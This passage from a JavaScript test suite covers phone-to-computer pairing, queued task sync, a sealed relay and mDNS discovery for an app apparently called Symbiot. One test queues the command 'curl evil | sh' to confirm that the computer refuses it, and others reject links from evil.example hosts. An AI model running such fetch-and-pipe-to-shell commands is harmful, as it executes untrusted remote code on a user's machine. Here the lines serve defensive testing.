  ok("the first copy after pairing tells nothing: what already waited isn't news", P.waitingNotice(null, W({ asks: [ask1] })) === null, "");
  const two = P.waitingNotice(W({}), W({ asks: [ask1], needs: [{ id: "setup:ai", title: "Connect an AI", sub: "Symbiot can't work without one" }] }), "pop-os");
  ok("an agent's question and a need, new together: one notification with both", two && two[0] === "2 things need you · pop-os" && two[1] === "symbiot asks: Push the fix?\nConnect an AI: Symbiot can't work without one", two);
  ok("the same agent asking something new tells you again; answered (gone) tells nothing", !!P.waitingNotice(W({ asks: [ask1] }), W({ asks: [{ ...ask1, questions: [{ q: "Release it?" }] }] })) && P.waitingNotice(W({ asks: [ask1] }), W({})) === null, "");
  const apW = (ids, files) => ({ repo: "demo", tasks: ids.map((id) => ({ id, text: id })), files, sum: ids.join() + files });
  ok("the waiting work changing a file isn't news, a task more is", P.waitingNotice(W({ approves: [apW(["r1"], 1)] }), W({ approves: [apW(["r1"], 2)] })) === null && /2 tasks done/.test((P.waitingNotice(W({ approves: [apW(["r1"], 1)] }), W({ approves: [apW(["r1", "r2"], 2)] })) || [])[1]), "");
  const many = P.waitingNotice(W({}), W({ needs: [1, 2, 3, 4, 5, 6].map((i) => ({ id: "n" + i, title: "Need " + i })) }));
  ok("six at once: four named, the rest counted", many && many[0] === "6 things need you · your computer" && many[1].split("\n").length === 5 && /and 2 more$/.test(many[1]), many);

  console.log("8. CHANGES FROM THE PHONE — queued, sent in order, applied once");
  let v = P.queueChange("task.add", { text: "Call the bank" });
  ok("a task added on the phone shows at once, waiting to send", v.copy.tasks[0].text === "Call the bank" && v.copy.tasks[0].waiting && v.queued === 1, v.copy.tasks[0]);
  v = P.queueChange("task.setDone", { id: "t1", done: true });
  v = P.queueChange("task.setDone", { id: "t1", done: false });
  v = P.queueChange("task.setDone", { id: "t2", done: true });
  ok("ticks show at once too; ticking the same task twice keeps only the last", v.queued === 3 && v.copy.tasks.find((t) => t.id === "t2").done && v.copy.tasks.find((t) => t.id === "t2").waiting, v.queued);
  const q1 = readJ(join(CFG, "phone-queue.json"));
  await P.pollComputer({ notify: () => {}, discover: async () => [] });
  let ct = await pc.cmd("tasks");
  ok("sent once the computer answers: added there, ticked there, and the queue is empty", ct.some((t) => t.text === "Call the bank") && ct.find((t) => t.id === "t2").done && !ct.find((t) => t.id === "t1").done && !existsSync(join(CFG, "phone-queue.json")), ct.map((t) => [t.text, t.done]));
  writeFileSync(join(CFG, "phone-queue.json"), JSON.stringify(q1));
  await P.pollComputer({ notify: () => {}, discover: async () => [] });
  ct = await pc.cmd("tasks");
  ok("the same queue sent twice is applied once (no second task)", ct.filter((t) => t.text === "Call the bank").length === 1, ct.map((t) => t.text));
  writeFileSync(join(CFG, "phone-queue.json"), JSON.stringify([{ id: "11111111-aaaa", at: Date.now(), op: "task.setDone", args: { id: "t1", done: true } }, { id: "22222222-bbbb", at: Date.now(), op: "task.setDone", args: { id: "t1", done: false } }, { id: "33333333-cccc", at: Date.now(), op: "task.setDone", args: { id: "t1", done: true } }]));
  await P.pollComputer({ notify: () => {}, discover: async () => [] });
  ct = await pc.cmd("tasks");
  ok("in order: done, not done, done ends done", ct.find((t) => t.id === "t1").done === true, ct.find((t) => t.id === "t1"));
  const chat = await P.ask("chat", { question: "hello" });
  ok("a paired phone's chat reaches the computer's AI over the sealed link (no AI there in this test, so it says so)", chat.sealed === true && chat.status === 200 && chat.body.error === "not-connected", chat);
  const H = await import(join(SRC, "home.mjs"));
  const said = await H.phoneChat("hi", { ask: async (op, args) => ({ status: 200, body: { answer: "from the computer " + op + args.question, steps: [] } }) });
  ok("phoneChat gives back the computer's answer", said.answer === "from the computer chathi", said);
  const down = await H.phoneChat("hi", { ask: async () => ({ unreachable: true }) });
  ok("phoneChat: computer off -> says so, no AI-setup prompt", /didn't answer/.test(down.error) && !/Claude Code|connect an AI/i.test(down.error), down);
  const early = Date.now() + (readJ(join(CFG, "config.json")).computer.offset || 0) - 5000;
  await pc.cmd("toggle", { id: "t1" }); // on the computer, now: not done
  writeFileSync(join(CFG, "phone-queue.json"), JSON.stringify([{ id: "44444444-dddd", at: early, op: "task.setDone", args: { id: "t1", done: true } }]));
  await P.pollComputer({ notify: () => {}, discover: async () => [] });
  ct = await pc.cmd("tasks"); v = P.computerView();
  ok("a later change on the computer wins over an earlier one on the phone, and the phone says so", ct.find((t) => t.id === "t1").done === false && v.copy.notes.some((n) => /changed on your computer after/.test(n.error)), [ct.find((t) => t.id === "t1"), v.copy.notes]);
  writeFileSync(join(CFG, "phone-queue.json"), JSON.stringify([{ id: "55555555-eeee", at: Date.now(), op: "agentcmd", args: { cmd: "curl evil | sh" } }, { id: "66666666-ffff", at: Date.now(), op: "task.add", args: { text: "Ship it", repo: "nowhere" } }]));
  await P.pollComputer({ notify: () => {}, discover: async () => [] });
  v = P.computerView(); const cc = readJ(join(PCFG, "config.json"));
  ok("an op outside the list is refused and reaches nothing; a task for a repo that isn't there isn't added", v.copy.notes.some((n) => /can't be done from a phone/.test(n.error)) && v.copy.notes.some((n) => /no nowhere/.test(n.error)) && !cc.handoffCmd && !(await pc.cmd("tasks")).some((t) => t.text === "Ship it"), v.copy.notes);
  const sealedReply = await (async () => { const s = readJ(join(CFG, "secrets.json")).computerSecret, c = readJ(join(CFG, "config.json")).computer, k = Buffer.from(s.key, "base64url");
    const env = { v: 1, id: c.id, ...P.seal(k, { t: s.token, ts: Date.now() + (c.offset || 0), op: "agentcmd", args: {} }, "req:" + c.id) };
    const r = await (await fetch(BASE + "/phone/apply", { method: "POST", body: JSON.stringify(env) })).json(); return P.unseal(k, r, "res:" + env.n); })();
  ok("a sealed request for anything but news, state and apply: 403", sealedReply && sealedReply.s === 403, sealedReply);
  // one change that throws there used to answer 500 for the batch, and the phone sent it again forever, with no news meanwhile
  const goodTasks = readFileSync(join(PCFG, "tasks.json"), "utf8"), sinceT = readJ(join(CFG, "config.json")).computer.since;
  writeFileSync(join(PCFG, "tasks.json"), "[null]"); // a list (an object in its place heals from the .bak now, core.mjs readState), with an entry that makes the tick throw
  writeFileSync(join(PCFG, "watch.json"), JSON.stringify({ watches: [], news: [{ id: "th", watch: "w1", name: "Inbox", ts: sinceT + 20, text: "Kim, Invoice paid" }], briefs: [] }));
  writeFileSync(join(CFG, "phone-queue.json"), JSON.stringify([{ id: "77777777-aaaa", at: Date.now(), op: "task.setDone", args: { id: "t2", done: false } }]));
  const toldT = [], pT = await P.pollComputer({ notify: (t, b) => toldT.push([t, b]), discover: async () => [] });
  v = P.computerView();
  ok("a change that throws on the computer: reported back as failed, out of the queue, and the news still comes", !v.queued && v.copy.notes.some((n) => n.id === "77777777-aaaa" && /failed on your computer/.test(n.error)) && toldT.some((t) => /Invoice paid/.test(t[1])) && !pT.error, [v.queued, v.copy.notes.slice(-1), toldT, pT.error]);
  writeFileSync(join(PCFG, "tasks.json"), goodTasks);
  writeFileSync(join(CFG, "phone-queue.json"), JSON.stringify([{ id: "88888888-aaaa", at: Date.now(), op: "task.add", args: { text: "Pay the rent" } }]));
  const k500 = Buffer.from(readJ(join(CFG, "secrets.json")).computerSecret.key, "base64url"); // the computer refusing the batch, sealed
  const no500 = (url, o) => (/\/phone\/apply$/.test(url) ? Promise.resolve(new Response(JSON.stringify(P.seal(k500, { s: 500, b: { error: "Something broke." } }, "res:" + JSON.parse(o.body).n)), { status: 200 })) : fetch(url, o));
  const p500 = await P.pollComputer({ fetchFn: no500, notify: () => {}, discover: async () => [] });
  ok("the whole batch refused: it stays queued, the copy still comes, and the phone says the changes haven't gone", P.computerView().queued === 1 && p500.last > pT.last - 1 && /haven't reached .* yet: Something broke/.test(p500.error || "") && !(await pc.cmd("tasks")).some((t) => t.text === "Pay the rent"), p500);
  const pOk = await P.pollComputer({ notify: () => {}, discover: async () => [] });
  ok("…and goes at the next try", !pOk.error && !P.computerView().queued && (await pc.cmd("tasks")).some((t) => t.text === "Pay the rent"), pOk);
  // 50 long tasks queued came to more than the relay takes in one request
  writeFileSync(join(CFG, "phone-queue.json"), JSON.stringify(Array.from({ length: 60 }, (_, i) => ({ id: `99999999-${String(i).padStart(4, "0")}`, at: Date.now(), op: "task.add", args: { text: `Long task ${i}: ` + `part${i} `.repeat(400) } }))));
  const sizes = [], pBig = await P.pollComputer({ fetchFn: (url, o) => { if (/\/phone\/apply$/.test(url)) sizes.push(String(o.body).length); return fetch(url, o); }, notify: () => {}, discover: async () => [] });
  ok("a big queue goes in parts, each under the relay's cap, all in one poll", !pBig.error && !P.computerView().queued && sizes.length > 1 && sizes.every((n) => n < P.RELAY_MAX) && (await pc.cmd("tasks")).filter((t) => /^Long task \d+:/.test(t.text)).length === 60, [pBig.error, P.computerView().queued, sizes]);

  console.log("8. APPROVE FROM THE PHONE — only what the phone showed, and never once unpaired");
  const demo = P.computerView().copy.approves.find((a) => a.repo === "demo");
  writeFileSync(join(REPO, "b.txt"), "more\n"); // the agent did more since the phone looked
  await sleep(5100); // past the computer's 5-second cache of the copy
  P.queueChange("pending.approve", { repo: "demo", sum: demo.sum });
  await P.pollComputer({ notify: () => {}, discover: async () => [] });
  v = P.computerView();
  ok("the work changed since the phone saw it: refused, and shown on the phone", !(await pc.cmd("approved")).length && v.copy.notes.some((n) => /changed since your phone showed it/.test(n.error)), v.copy.notes.slice(-1));
  const fresh = v.copy.approves.find((a) => a.repo === "demo");
  ok("…the copy now shows what's there (two files)", fresh && fresh.files === 2 && fresh.sum !== demo.sum, fresh);
  P.queueChange("pending.approve", { repo: "demo", sum: fresh.sum });
  await P.pollComputer({ notify: () => {}, discover: async () => [] });
  await sleep(300);
  const did = await pc.cmd("approved"); const snap = await pc.cmd("snapshot");
  ok("what the phone showed is what's there: approved, the same Approve as the button", did.length === 1 && did[0].repo === "demo" && !did[0].untasked, did);
  ok("…and the computer says which phone approved it", snap.recent.some((r) => r.repo === "demo" && r.phone === "Pixel" && r.status === "approved" && /pull\/7/.test(r.pr)), snap.recent);
  const id = (await pc.cmd("state")).phones.find((p) => p.name === "Pixel").id;
  await pc.cmd("unpair", { id });
  P.queueChange("pending.approve", { repo: "demo", sum: fresh.sum });
  P.queueChange("task.add", { text: "Water the plants" });
  const un = await P.pollComputer({ notify: () => {}, discover: async () => [] });
  ok("unpaired: its queued approve is refused, sealed, dropped, and the phone is told", (await pc.cmd("approved")).length === 1 && /unpaired/.test(un.error || "") && P.computerView().copy.notes.some((n) => /Not approved: this phone was unpaired/.test(n.error)), [un.error, P.computerView().queued]);
  ok("…and the rest of what it had queued is dropped too, said so, rather than sent again every poll", !P.computerView().queued && P.computerView().copy.notes.some((n) => /Not sent: this phone was unpaired/.test(n.error) && n.what === "Water the plants") && !(await pc.cmd("tasks")).some((t) => t.text === "Water the plants"), P.computerView().copy.notes.slice(-2));

  console.log("8. WITH THE COMPUTER OFF — kept, then sent when it starts");
  const code3 = (await pc.cmd("code")).code;
  const re = await P.pairComputer(`127.0.0.1:${port}`, code3, { name: "Pixel" });
  ok("paired again with the same computer: the copy stays", re.paired && !re.error && existsSync(join(CFG, "computer.json")), re);
  await pc.stop();
  v = P.queueChange("task.add", { text: "Book the flights" });
  const offPoll = await P.pollComputer({ notify: () => {}, discover: async () => [] });
  v = P.computerView();
  ok("the computer is off: the phone still shows its tasks (the copy) and the new one waiting to send", v.copy.tasks.some((t) => t.text === "Write the release notes") && v.copy.tasks.some((t) => t.text === "Book the flights" && t.waiting) && offPoll.error, [v.copy.tasks.length, offPoll.error]);
  pc = startComputer(); await pc.ready; await pc.cmd("on");
  await P.pollComputer({ notify: () => {}, discover: async () => [] });
  ok("…it starts: the task is there", (await pc.cmd("tasks")).some((t) => t.text === "Book the flights") && !P.computerView().queued, P.computerView().queued);

  if (typeof globalThis.WebSocket !== "function") console.log("9. AWAY FROM HOME — skipped: the relay link needs Node 22 or newer (this is " + process.version + ")");
  else {
  console.log("9. AWAY FROM HOME — through the relay, which only passes sealed messages");
  // the relay in this process (relay/server.mjs); SYMBIOT_TEST_RELAY=<url> runs these against
  // another one instead: the Worker in Miniflare, or the deployed relay.symbiot.co.za
  const { startRelay } = await import("../relay/server.mjs");
  const taps = [], elsewhere = process.env.SYMBIOT_TEST_RELAY;
  const relay = elsewhere ? { close() {} } : await startRelay({ tap: (k, t) => taps.push(t) });
  const RELAY = elsewhere ? elsewhere.replace(/\/+$/, "") : `http://127.0.0.1:${relay.port}`;
  await pc.stop(); pc = startComputer({ SYMBIOT_NO_RELAY: "0", SYMBIOT_RELAY: RELAY }); await pc.ready; await pc.cmd("on");
  let rs = null; for (let i = 0; i < 40 && !(rs && rs.relay.connected); i++) { await sleep(100); rs = await pc.cmd("state"); }
  ok("the computer keeps a line open to the relay while a phone is paired", rs && rs.relay.connected, rs && rs.relay);
  const code4 = (await pc.cmd("code")).code;
  const r4 = await P.pairComputer(`127.0.0.1:${port}`, code4, { name: "Pixel" });
  const rc = readJ(join(CFG, "config.json")).computer;
  ok("pairing gives the phone the relay's address and the pair's id, a hash, not the token or a name", r4.paired && rc.relay && rc.relayUrl === RELAY && rc.relay.length === 32 && !rc.relay.includes(rc.name), rc);
  rc.url = "http://127.0.0.1:1"; rc.urls = []; writeFileSync(join(CFG, "config.json"), JSON.stringify({ ...readJ(join(CFG, "config.json")), computer: rc }));
  const pc2 = readJ(join(CFG, "config.json")).computer;
  writeFileSync(join(PCFG, "watch.json"), JSON.stringify({ watches: [], news: [{ id: "z", watch: "w1", name: "Inbox", ts: pc2.since + 50, text: "Lee, Quarterly numbers" }], briefs: [] }));
  told.length = 0;
  const viaR = await P.pollComputer({ notify, discover: async () => [] });
  ok("with your Wi-Fi out of reach, news and the copy come through the relay", !viaR.error && viaR.via === "relay" && told.length === 1 && /Quarterly numbers/.test(told[0][1]) && readJ(join(CFG, "computer.json")).tasks.length > 2, [viaR, told]);
  if (elsewhere) console.log("  - (another relay: what it saw isn't in reach of this test)");
  else ok("the relay saw nothing plain: no subject, no task, no token", taps.length >= 4 && !taps.some((t) => /Quarterly|Lee,|release notes|Book the flights/.test(t) || t.includes(readJ(join(CFG, "secrets.json")).computerSecret.token)), taps.map((t) => t.slice(0, 80)));
  P.queueChange("task.add", { text: "Renew the domain" });
  await P.pollComputer({ notify: () => {}, discover: async () => [] });
  ok("a change made away from home reaches the computer through it too", (await pc.cmd("tasks")).some((t) => t.text === "Renew the domain"), "");
  const strange = await fetch(`${RELAY}/v1/${"x".repeat(32)}/ask`, { method: "POST", body: "{}" });
  ok("a stranger's pairing id gets nothing (the computer isn't there for it)", strange.status === 503, strange.status);
  const imp = await new Promise((res) => { const ws = new WebSocket(`${RELAY.replace("http", "ws")}/v1/${rc.relay}/computer`); ws.onopen = () => ws.send(JSON.stringify({ hello: "not-the-secret-not-the-secret" })); ws.onmessage = (e) => res(JSON.parse(e.data)); setTimeout(() => res(null), 3000); });
  ok("someone else can't take the computer's place on the relay (it must show the secret behind the id)", imp && /isn't this pair's computer/.test(imp.error), imp);
  const still = await P.pollComputer({ notify: () => {}, discover: async () => [] });
  ok("…and the real computer still answers", !still.error && still.via === "relay", still);
  // away from home, every ask went through each saved address, then discovery, and only then the relay
  const order = [], rec = (url, o) => { order.push(url.replace(RELAY, "RELAY").replace(/^http:\/\/127\.0\.0\.1:\d+/, "LAN")); return fetch(url, o); };
  const pA = await P.pollComputer({ fetchFn: rec, notify: () => {}, discover: async () => { order.push("DISCOVER"); return []; } });
  const firstAsk = order.findIndex((u) => /^RELAY\/v1\/.*\/ask$/.test(u));
  ok("the last answer came through the relay: the next asks go there first, with no wait on the dead Wi-Fi address or discovery", !pA.error && firstAsk >= 0 && firstAsk <= 1 && !order.includes("DISCOVER") && !order.some((u) => /^LAN\/phone\/(news|state)$/.test(u)), order);
  const rcHome = readJ(join(CFG, "config.json")); rcHome.computer.url = BASE; writeFileSync(join(CFG, "config.json"), JSON.stringify(rcHome));
  order.length = 0; await P.pollComputer({ fetchFn: rec, notify: () => {}, discover: async () => [] });
  ok("…back home, the Wi-Fi it looked at alongside answers, so the next ask goes there", order.indexOf("LAN/phone/state") > order.findIndex((u) => /^RELAY.*\/ask$/.test(u)) && order.findIndex((u) => /^RELAY.*\/ask$/.test(u)) >= 0, order);
  rcHome.computer.url = "http://127.0.0.1:1"; writeFileSync(join(CFG, "config.json"), JSON.stringify(rcHome));
  // the relay in trouble read as the computer being off or asleep; an answer too big for it was dropped, and came back a 504 after 25 s
  const at = (status, body) => (url, o) => (/\/ask$/.test(url) ? Promise.resolve(new Response(JSON.stringify(body), { status })) : fetch(url, o));
  const relayBusy = await P.pollComputer({ fetchFn: at(429, { error: "Too many requests: wait a minute." }), notify: () => {}, discover: async () => [] });
  ok("the relay busy (429): the phone says the relay is busy, not that the computer is off", /relay \(.*\) is busy/.test(relayBusy.error || "") && !/off or asleep/.test(relayBusy.error), relayBusy.error);
  const cfErr = await P.pollComputer({ fetchFn: at(503, { error: "error code: 1015" }), notify: () => {}, discover: async () => [] });
  ok("…the relay itself failing (not its \"away\"): says so, and that the computer may be fine", /isn't working right now \(it answered 503\)/.test(cfErr.error || ""), cfErr.error);
  const gone = await P.pollComputer({ fetchFn: at(503, { away: true, error: "Your computer isn't connected to the relay (it may be off, asleep or offline)." }), notify: () => {}, discover: async () => [] });
  ok("…the computer not connected to it: that one is the computer being away", /off or asleep/.test(gone.error || ""), gone.error);
  const big = await P.pollComputer({ fetchFn: at(502, { tooBig: true, error: "too big" }), notify: () => {}, discover: async () => [] });
  ok("…an answer too big for it: says so", /too big for the relay/.test(big.error || ""), big.error);
  const relay2 = await startRelay({}), R2 = `http://127.0.0.1:${relay2.port}`, fakeId = P.relayOf(P.newKeys().priv);
  const line = new WebSocket(`${R2.replace("http", "ws")}/v1/${fakeId.id}/computer`);
  await new Promise((res) => { line.onopen = () => line.send(JSON.stringify({ hello: fakeId.secret })); line.onmessage = (e) => { const m = JSON.parse(e.data); if (m.ready) { line.onmessage = (e2) => { const q = JSON.parse(e2.data); if (q.rid) line.send(JSON.stringify({ rid: q.rid, s: 200, b: { c: "x".repeat(300 * 1024) } })); }; res(); } }; setTimeout(res, 3000); });
  const t10 = Date.now(), huge = await fetch(`${R2}/v1/${fakeId.id}/ask`, { method: "POST", body: "{}" }), hugeJ = await huge.json();
  ok("the relay given an answer over its cap tells the phone at once (502, too big), rather than a 504 after 25 s", huge.status === 502 && hugeJ.tooBig && Date.now() - t10 < 5000, [huge.status, hugeJ, Date.now() - t10]);
  line.close(); relay2.close();
  const snapBig = { v: "x", tasks: [], reports: Array.from({ length: 5 }, (_, i) => ({ id: "r" + i, title: "R" + i, text: "word ".repeat(12000) })) };
  const fit = P.fitRelay(200, snapBig, 40 * 1024), fitNone = P.fitRelay(200, snapBig, 4 * 1024), fitNo = P.fitRelay(200, { news: ["y".repeat(300 * 1024)] }, P.RELAY_MAX);
  const applied = P.fitRelay(200, { results: [{ id: "a", ok: true }], state: snapBig }, 40 * 1024), appliedBare = P.fitRelay(200, { results: [{ id: "a", ok: true }], state: { ...snapBig, tasks: Array.from({ length: 400 }, (_, i) => ({ id: "t" + i, text: "x".repeat(200) })) } }, 4 * 1024);
  ok("an apply's answer is trimmed the same way (its copy is under state), and at worst the results go alone: the phone never gets 413 for changes that landed", applied.status === 200 && applied.body.results[0].ok && applied.body.state.reports.every((r) => r.cut) && appliedBare.status === 200 && appliedBare.body.results[0].ok && appliedBare.body.state === null, [applied.status, appliedBare.status, appliedBare.body]);
  ok("the computer keeps what it sends through the relay under its cap: the reports' text cut first, then the reports listed without text, else a plain refusal", fit.status === 200 && fit.body.reports.length === 5 && fit.body.reports.every((r) => r.cut && r.text.length <= 1500) && fitNone.status === 200 && fitNone.body.reports.length === 5 && fitNone.body.reports.every((r) => r.more && r.text === undefined) && fitNo.status === 413 && /too big/.test(fitNo.body.error) && P.fitRelay(200, snapBig, 0).body === snapBig, [fit.status, fitNone.status, fitNo.status]);
  await pc.stop(); pc = startComputer({ SYMBIOT_NO_RELAY: "0", SYMBIOT_RELAY: RELAY }); await pc.ready;
  const cOff = readJ(join(PCFG, "config.json")); cOff.phoneLink.relay = false; writeFileSync(join(PCFG, "config.json"), JSON.stringify(cOff));
  await pc.cmd("on"); await sleep(400);
  const offR = await P.pollComputer({ notify: () => {}, discover: async () => [] });
  ok("with the relay switched off on the computer, nothing goes through it (Wi-Fi only)", offR.error && !(await pc.cmd("state")).relay.connected, [offR.error, (await pc.cmd("state")).relay]);
  relay.close();
  }

  console.log("3. FOUND ON THE NETWORK — mDNS, its name neutral, its TXT the key's fingerprint");
  const { announce, browse, encMessage, decMessage, T } = await import("../mdns.mjs");
  const back = decMessage(encMessage({ response: true, answers: [{ name: "_symbiot._tcp.local", type: T.PTR, data: "Symbiot-1a2b._symbiot._tcp.local" }], additionals: [{ name: "Symbiot-1a2b._symbiot._tcp.local", type: T.TXT, data: { v: 1, fp: "Abc" } }, { name: "symbiot-1a2b.local", type: T.A, data: "192.168.8.50" }] }));
  ok("its DNS messages read back", back.records[0].data === "Symbiot-1a2b._symbiot._tcp.local" && back.records[1].data.fp === "Abc" && back.records[2].data === "192.168.8.50", back.records);
  // a pretend network in this process: multicast to every socket on 5353, the rest to its port
  const bus = new Set();
  const fake = () => { const h = {}; let pt = 0; const s = { on: (e, f) => { h[e] = f; }, bind: (p, cb) => { pt = p || 40000 + bus.size; bus.add(s); setTimeout(cb, 0); }, setMulticastTTL() {}, setMulticastLoopback() {}, addMembership() {}, setMulticastInterface() {}, unref() {},
    close() { bus.delete(s); }, send(msg, toPort, to) { for (const o of [...bus]) if (o !== s && (to === "224.0.0.251" ? o.port === 5353 : o.port === toPort)) setTimeout(() => o.h.message && o.h.message(Buffer.from(msg), { address: "127.0.0.1", port: pt }), 0); }, get port() { return pt; }, h };
    return s; };
  const an = announce({ id: "1a2b", port: 7392, fp: on.fp, addresses: () => ["192.168.8.50", "10.0.0.7"] }, { socket: fake });
  const seenNet = await browse({ socket: fake, timeout: 200 });
  ok("asked on the network, it answers with its port, addresses and fingerprint, under a neutral name", seenNet.length === 1 && seenNet[0].port === 7392 && seenNet[0].addresses.join() === "192.168.8.50,10.0.0.7" && seenNet[0].fp === on.fp && seenNet[0].name === "Symbiot-1a2b" && !seenNet[0].name.includes(String((await import("node:os")).hostname())), seenNet);
  an.stop(); await sleep(100);
  ok("switched off: it stops answering", (await browse({ socket: fake, timeout: 150 })).length === 0, "");
  // what it answers with: only what the asker can reach (ops saw avahi pick the Tailscale address)
  const ifs = { lo: [{ family: "IPv4", address: "127.0.0.1", netmask: "255.0.0.0", internal: true }], wlp2s0: [{ family: "IPv4", address: "192.168.1.40", netmask: "255.255.255.0" }],
    tailscale0: [{ family: "IPv4", address: "100.101.102.103", netmask: "255.255.255.255" }], wg0: [{ family: "IPv4", address: "10.8.0.2", netmask: "255.255.255.0" }], eth1: [{ family: "IPv4", address: "10.0.5.4", netmask: "255.255.0.0" }] };
  ok("a phone on the Wi-Fi gets the Wi-Fi address only, not Tailscale's", P.mdnsAddresses("192.168.1.77", ifs).join() === "192.168.1.40", P.mdnsAddresses("192.168.1.77", ifs));
  ok("…an asker on another network gets that network's address (::ffff: form too)", P.mdnsAddresses("::ffff:10.0.9.9", ifs).join() === "10.0.5.4", P.mdnsAddresses("::ffff:10.0.9.9", ifs));
  ok("…an announcement, or an asker on no network of ours, gets every address but a VPN's", P.mdnsAddresses(undefined, ifs).join() === "192.168.1.40,10.0.5.4" && P.mdnsAddresses("8.8.8.8", ifs).join() === "192.168.1.40,10.0.5.4", P.mdnsAddresses(undefined, ifs));
  ok("…and a computer with only a VPN still answers with it", P.mdnsAddresses(undefined, { tailscale0: ifs.tailscale0 }).join() === "100.101.102.103", "");
  const askers = [], an2 = announce({ id: "3c4d", port: 7392, fp: on.fp, addresses: (who) => { askers.push(who); return who ? ["192.168.8.51"] : ["192.168.8.51", "10.0.0.8"]; } }, { socket: fake });
  await sleep(20); const seen2 = await browse({ socket: fake, timeout: 200 }); an2.stop(); await sleep(100);
  ok("…the asker's address reaches that choice, and the answer carries what it chose", askers.includes("127.0.0.1") && seen2.length === 1 && seen2[0].addresses.join() === "192.168.8.51", [askers, seen2]);
  const offSt = await pc.cmd("off");
  ok("nothing is announced while the link is off", offSt.found === false, offSt.found);
  const real = announce({ id: "9z9z", port: 7999, fp: "testfp", addresses: (who) => P.mdnsAddresses(who) }, { onError: () => {} });
  const onNet = real ? await browse({ timeout: 1500 }) : [];
  if (real) real.stop();
  if (onNet.some((x) => x.fp === "testfp")) ok("on a real network, a query over multicast finds it", true);
  else console.log("  - skipped: no multicast here (a sandbox, or no network), so the real-network check didn't run");

  console.log("2. THE QR — the link it carries, read back from its modules");
  const Q = await import("../qr.mjs");
  const decode = ({ modules, version }) => {
    const n = modules.length, f = [];
    for (let i = 0; i < 15; i++) f.push(i < 6 ? modules[i][8] : i < 8 ? modules[i + 1][8] : i === 8 ? modules[8][7] : modules[8][14 - i]);
    const fmt = f.reduce((a, b, i) => a | ((b ? 1 : 0) << i), 0) ^ 0x5412, mask = (fmt >> 10) & 7, ec = (fmt >> 13) & 3;
    const { fixed } = Q.frame(version), order = Q.dataOrder(n, fixed), bits = order.map(([r, c]) => (modules[r][c] !== Q.MASKS[mask](r, c) ? 1 : 0));
    const words = []; for (let i = 0; i + 8 <= bits.length; i += 8) words.push(parseInt(bits.slice(i, i + 8).join(""), 2));
    const [, b1, d1, b2, d2] = Q.M_BLOCKS[version], sizes = [...Array(b1).fill(d1), ...Array(b2).fill(d2)], blocks = sizes.map(() => []);
    let k = 0; for (let i = 0; i < Math.max(d1, d2); i++) sizes.forEach((s, b) => { if (i < s) blocks[b].push(words[k++]); });
    const data = blocks.flat(), dbits = data.flatMap((w) => [7, 6, 5, 4, 3, 2, 1, 0].map((i) => (w >> i) & 1)), num = (at, len) => parseInt(dbits.slice(at, at + len).join(""), 2);
    const cb = Q.countBits(version), count = num(4, cb), bytes = []; for (let i = 0; i < count; i++) bytes.push(num(4 + cb + 8 * i, 8));
    return { ec, mode: num(0, 4), text: Buffer.from(bytes).toString("utf8") };
  };
  const texts = [on.link, P.pairLink("123456"), "symbiot://pair?a=192.168.8.50,10.0.0.7&p=7392&c=004211&k=" + on.fp, "é漢字🙂 " + "x".repeat(200)];
  const backs = texts.map((t) => decode(Q.qrMatrix(t)));
  ok("each QR decodes back to its link: level M, byte mode", backs.every((b, i) => b.text === texts[i] && b.ec === 0 && b.mode === 4), backs.map((b) => b.text.slice(0, 40)));
  ok("every mask decodes too", [0, 1, 2, 3, 4, 5, 6, 7].every((m) => decode(Q.qrMatrix(texts[0], { mask: m })).text === texts[0]), "");
  const svg = Q.qrSvg(on.link);
  ok("the SVG has the quiet zone around (4 modules) and scales by its viewBox", /viewBox="0 0 (\d+) \1"/.test(svg) && Number(svg.match(/viewBox="0 0 (\d+)/)[1]) === Q.qrMatrix(on.link).size + 8, svg.slice(0, 120));
  const lanLink = on.link.replace(/a=[^&]*/, "a=192.168.8.50"); // (this test's computer may have no network address of its own)
  const parsed = [P.parsePairLink(lanLink), P.parsePairLink(texts[2]), P.parsePairLink("https://evil.example/pair#a=1.2.3.4&p=1&c=123456&k=x"), P.parsePairLink("symbiot://pair?a=1.2.3.4&c=12")];
  ok("a scanned link: the site's or the app's own form; anything else isn't one", parsed[0] && parsed[0].code === on.code && parsed[0].fp === on.fp && parsed[1].addresses.join() === "192.168.8.50,10.0.0.7" && parsed[1].port === 7392 && !parsed[2] && !parsed[3], parsed);
  const pub = P.parsePairLink("symbiot://pair?a=8.8.8.8,evil.example.com,192.168.1.9,fe80::1,my-pc.local&p=7392&c=004211&k=x"), pubOnly = P.parsePairLink("symbiot://pair?a=8.8.8.8,symbiot.co.za&p=7392&c=004211&k=x");
  ok("a pair link keeps only addresses on your own network (a web page can fire one): public ones are dropped, and with none left it isn't a link", pub && pub.addresses.join() === "192.168.1.9,fe80::1,my-pc.local" && pubOnly === null, [pub, pubOnly]);
  const scanned = (await pc.cmd("on"));
  const viaLink = await P.pairComputer("", "", { link: scanned.link.replace(/a=[^&]*/, "a=10.255.255.1,127.0.0.1"), name: "Pixel" });
  ok("pairing by its link tries each address until one answers", viaLink.paired && !viaLink.error, viaLink);
  const code5 = (await pc.cmd("code"));
  const fake5 = await P.pairComputer("", "", { link: code5.link.replace(/a=[^&]*/, "a=127.0.0.1").replace(/k=[\w-]+/, "k=AAAAAAAAAAAAAAAAAAAAAA"), name: "Pixel" });
  ok("a link whose key isn't the computer's: refused, nothing sent", /isn't the one whose code you scanned/.test(fake5.error || ""), fake5.error);
  const ab2 = await pc.cmd("adb", { rounds: ["NEW456"] });
  ok("adbLink: a code not opened by Pair a phone (this app starting, a QR's) never opens a cable's phone", !ab2.did[0].length && !ab2.calls.some((c) => / am start /.test(c)), ab2);
  // Pair a phone pressed here: the cable's phone gets it once; one left unpaired is said once, and never pushed again by itself
  await pc.cmd("usbcode");
  const ab3 = await pc.cmd("adb", { rounds: ["NEW456", "NEW456", "", "NEW456"] });
  ok("adbLink: Pair a phone sends the link to a cable's phone once, however often it comes back", ab3.did[0].join() === "NEW456" && ab3.calls.filter((c) => / am start /.test(c)).length === 1, ab3.did);
  const usbSt = await pc.cmd("state");
  ok("Settings says it went to the phone on the cable", usbSt.usbSent === 1 && !usbSt.usbFail, usbSt.usbSent);
  const ab4 = await pc.cmd("adb", { rounds: ["NEW456", "OTHER9"], later: 11 * 60000 });
  const missed = await pc.cmd("state", { later: 11 * 60000 });
  ok("a code the cable's phone didn't pair with runs out: said once (Home, Settings), nothing pushed after", !ab4.calls.some((c) => / am start /.test(c)) && missed.usbFail && /didn't pair within 10 minutes/.test(missed.usbFail.why) && !missed.code, [ab4.calls, missed.usbFail]);
